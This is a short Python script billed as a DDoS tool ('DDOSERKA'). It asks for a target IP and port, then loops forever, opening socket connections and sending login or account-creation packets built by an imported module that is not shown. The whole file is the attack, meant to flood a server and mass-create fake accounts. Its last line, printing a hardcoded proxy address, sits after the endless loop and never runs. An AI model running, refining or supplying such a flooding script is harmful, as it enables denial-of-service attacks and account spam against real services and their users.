from login import login
from utils import Reader
import socket
from colorama import Fore, Back, Style
print(Fore.YELLOW+"DDOSERKA BY LEONARDDEV"+Style.RESET_ALL)
ip = input("\033[0;37m[DDoS] Enter IP >> ")
port = input(Fore.BLUE+"PORT>>> "+Style.RESET_ALL)
bulid = input(Fore.RED+"Bulid>>> "+Style.RESET_ALL)
version = int(input(Fore.GREEN+"Version>>> "+Style.RESET_ALL))
accounts = 0

while True:
   try:
      createacc = login().send_hello(version)
      s = socket.socket()
      s.connect((ip, int(port)))
      s.send(createacc)
      print(f"\033[32m[DDoS] Successful created {accounts} account!")
      accounts +=1
   except OSError:
      print("\033[31m[DDoS] Creating account error!")
      pass
print("Proxy>>> 142.132.152.175")